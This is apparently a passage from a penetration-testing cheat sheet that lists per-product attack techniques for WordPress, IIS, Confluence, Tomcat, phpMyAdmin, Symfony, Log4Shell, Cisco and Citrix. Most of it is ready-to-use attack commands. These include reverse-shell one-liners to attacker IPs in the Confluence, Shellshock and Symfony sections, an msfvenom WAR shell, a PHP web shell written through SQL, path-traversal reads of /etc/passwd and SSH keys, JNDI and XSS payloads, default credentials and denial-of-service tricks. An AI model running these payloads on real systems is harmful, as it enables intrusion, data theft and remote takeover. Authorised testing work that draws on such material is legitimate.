  - `wpscan --url <domain> --api-token <your-api-token>`
  - `wpscan --url <target> --enumerate p --plugins-detection aggressive -o results`
  - `wpscan --url https://example[.]com --api-token <api token> --plugins-detection mixed -e vp,vt,cb,dbe,u1-10 --force` [[source]](https://twitter.com/TakSec/status/1671202550844993543)
- Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress`
- If you login as admin, you can achieve RCE
  - modify the theme in 'Appearance' > 'Theme Editor'
  - add `<?php exec("whoami")?>`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- Check `wp-config.php`
- Find outdated plugins and use searchsploit

**Resources**
- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
- https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
- [WordPress Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md)



## IIS - Internet Information Services

- Check if `trace.axd` is enabled
- Search for
  ```
  Views/web.config
  bin/WebApplication1.dll
  System.Web.Mvc.dll
  System.Web.Mvc.Ajax.dll
  System.Web.Mvc.Html.dll
  System.Web.Optimization.dll
  System.Web.Routing.dll
  ```
- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
- Microsoft IIS 6.0, many RCE and BoF
  - https://www.exploit-db.com/exploits/41738
  - `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
- Tilde / shortname enumeration
  1. [200 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/idontexist*~.*" 2>&1 | grep "HTTP/1.1"`
  2. [404 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/aspnet~1.*" 2>&1 | grep "HTTP/1.1"`
  3. `java -jar /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/config.xml`
  		- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
		- Check also [IIS Tilde Enumeration Scanner](https://portswigger.net/bappstore/523ae48da61745aaa520ef689e75033b) for Burp Suite
- IIS file extensions https://learn.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)?redirectedfrom=MSDN


**Resources**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)

## Microsoft SharePoint

- Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents

## Lotus Domino

- Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
- Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
- Fuzzing list: [SecLists/LotusNotes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/LotusNotes.fuzz.txt)



## phpLDAPadmin

- Endpoint: `phpldapadmin/index.php`
- Try default logins
- XSS
  - `cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1`
  - `cmd.php?server_id=<script>alert('Orwa')</script>`
- See [Godfather Orwa's tweet](https://twitter.com/GodfatherOrwa/status/1701392754251563477)



## Git source code exposure

Once you have the source code, look for the secrets within the files. To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Other tools**
- [DotGit](https://github.com/davtur19/DotGit) find if a website has `.git` exposed
- nuclei template `%USERPROFILE%\nuclei-templates\exposures\configs\git-config.yaml`
- [GitDumper from GitTools](https://github.com/internetwache/GitTools)



## Subdomain takeover

- [Subdomain Takeover in Azure: making a PoC](https://godiego.co/posts/STO-Azure/)

**Tools**
- [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
- nuclei template `%USERPROFILE%\nuclei-templates\takeovers`




## Second-Order Takeover

> "Always consider covering second-order takeovers, because in most cases they are evaluated as critical, like a blind XSS, which is remotely controllable and even application-wide." [[Reference](https://x.com/slymn_clkrsln/status/1792995208562401567)]

Read also [Second-Order Takeover: Scoring High Rewards by nocley](https://medium.com/@nocley/second-order-takeover-scoring-high-rewards-926ff658b76b)



## 4** Bypass
- [byp4xx](https://github.com/lobuhi/byp4xx), s/o to [m0pam](https://twitter.com/m0pam) for the tip
- Search for subdomain with subfinder. Httpx filters subdomains with a 403 response and prints their cname. Test the cname for a bypass
  `subfinder -d atg.se — silent | httpx -sc -mc 403 -cname`, s/o to [drak3hft7](https://twitter.com/drak3hft7) for the tip
- [403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122) Burp extension, test 403 bypasses on the run
- Replace `HTTP/n` with `HTTP/1.1`, `HTTP/2` or `HTTP/3`
- Change the request from `GET` to `POST` or viceversa



## Application level Denial of Service

- If the application gives the possibility to download data, try to download too much data
  - If there are restrictions, try to bypass
- In file uploads, try to upload huge files
- In chat section, try to send big messages and see how the application behaves
- [Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
  - search for [`RegExp()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp)
- Long Password DoS Attack (Note: the value of password is hashed and then stored in Databases)
  - Check for length restriction and play with it
  - If there is no restriction, test until the application slows down
- [password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)
- Long string DoS
- DoS against a victim
  - Sending a reset link might disable an user's account, spam to prevent the user from accessing their account
  - Multiple wrong passwords might disable an user's account

## APIs attacks

Common API path convention: `/api_name/v1`

### Bruteforce APIs paths with gobuster

1. Create a pattern file
   ```
   echo {GOBUSTER}/v1 > patterns
   echo {GOBUSTER}/v2 >> patterns
   echo {GOBUSTER}/v3 >> patterns
   ```
2. Run the command `gobuster dir -u <TARGET> -w /usr/share/wordlists/wordlist.txt -p patterns`
3. Inspect the endpoints fuond with `curl` and use recursion


## Grafana attacks

**CVE-2021-43798**: Grafana versions 8.0.0-beta1 through 8.3.0, except for patched versions, are vulnerable to directory traversal
- `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
  - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file


## Confluence attacks


### CVE-2022-26134

1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
3. Run a listener `nc -nvlp 4444`


## Kibana

- RCE https://github.com/mpgn/CVE-2019-7609
- If you are unable to get code execution reset the machine and try again in a incognito browser window.
- Remember run the payload on Timelion and then navigate Canvas to trigger it


## Argus Surveillance DVR

- LFI: `http://192.168.212.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
- Password located at `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
  - weak password encryption
  - l'exploit trova un carattere per volta. Non funziona con i caratteri speciali > se trovi 'Unknown' significa che `e un carattere speciale e lo devi scoprire manualmente
  

## Shellshock

- If you find `/cgi-bin/`, search for extensions `sh`, `cgi`, `py`, `pl` and more
- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.49.124/1234 0>&1' http://192.168.124.87/cgi-bin/test.sh`


## Cassandra web

- `pip install cqlsh`
- `cqlsh <IP>`
- `sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:4444`
  - runnato come root, puoi vedere tutti i file del sistema
  - `curl --path-as-is localhost:4444/../../../../../../../../etc/passwd`
- https://book.hacktricks.xyz/network-services-pentesting/cassandra
- https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2


## RaspAP

- `http://192.168.157.97:8091/includes/webconsole.php`


## Drupal

- Enumerate version by seeing `/CHANGELOG.txt`
- Enumerate modules and search for specific vulnerabilities
- Enumerate nodes with Burp Intruder and `https://drupal-target.io/node/§1§` to find hidden pages
- `droopescan scan drupal -u https://drupal-target.io`

Drupalgeddon
- [drupal_drupalgeddon2.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/drupal_drupalgeddon2.rb)
- [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
- [drupalgeddon3.py](https://github.com/oways/SA-CORE-2018-004)
	- `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`

Drupal 7.x and PHP Filter RCE
- If the core module "PHP Filter" is enabled, it is possible to inject PHP code where you can submit content
- If you are admin, you can create a new page with PHP code through `/node/add/page`



## Tomcat

- Default creds
  - `tomcat:s3cret`
  - https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
- File uploads in tomcat/manager
  1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
  2. Go to `http://10.10.10.85/shell`


## Booked Scheduler

- 2.7.5 RCE: https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
- LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`


## phpMyAdmin

- Try `root` without password or `root:password`
- If you can login, try this query for a RCE
  ```SQL
  SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"
  SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
  ```
  
  
## PHP

- Command Execution - `preg_replace()` PHP Function Exploit - RCE https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
- `<?php echo system($_GET['cmd']); ?>`
- [Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)


## Symphony

- [Symphony | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)
- http://victim.com/app_dev.php/_profiler/open?file=app/config/parameters.yml
  - get the 'secret'
- https://github.com/ambionics/symfony-exploits
  - `python3 secret_fragment_exploit.py 'http://192.168.164.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.164.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.45.154/80 0>&1'"`


## Adobe ColdFusion

- See if you find `/CFIDE` or `.cfm` pages
- It usually runs on port `8500`
- RCE: https://www.exploit-db.com/exploits/50057


## Webmin

- https://github.com/MuirlandOracle/CVE-2019-15107
  - type 'shell' to get a reverse shell (use ncat with rlwrap)


## Broken Link Hijacking

Resources:
- [Hunting for Broken Link Hijacking (BLH)](https://www.cobalt.io/blog/hunting-for-broken-link-hijacking-blh)
- [Broken Link Hijacking - Mr. User-Agent](https://shahjerry33.medium.com/broken-link-hijacking-mr-user-agent-cd124297f6e6)
- [Broken Link Checker](https://www.deadlinkchecker.com/website-dead-link-checker.asp)
- [stevenvachon/broken-link-checker](https://github.com/stevenvachon/broken-link-checker)
- [socialhunter](https://github.com/utkusen/socialhunter)



## Log4Shell

- Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`



## Spring Boot

- Check `/env` for RCE, `/heapdump` for private keys
- Check also `/jolokia`

Resources
- [LandGrey/SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)
- [Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)
- [Memory Analyzer (MAT)](https://eclipse.dev/mat/) (for analyzing `/heapdump`)



## Apache

**Misconfiguration leading to SSRF**

```
GET http://localhost:22
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: */*


```

Resources:
- [Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)


## Cisco

**CVE-2020-3580**
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://domain/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
      <input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
      <input type="hidden" name="" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
 
## Citrix

**CVE-2023-24488**
```
https://domain/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
```
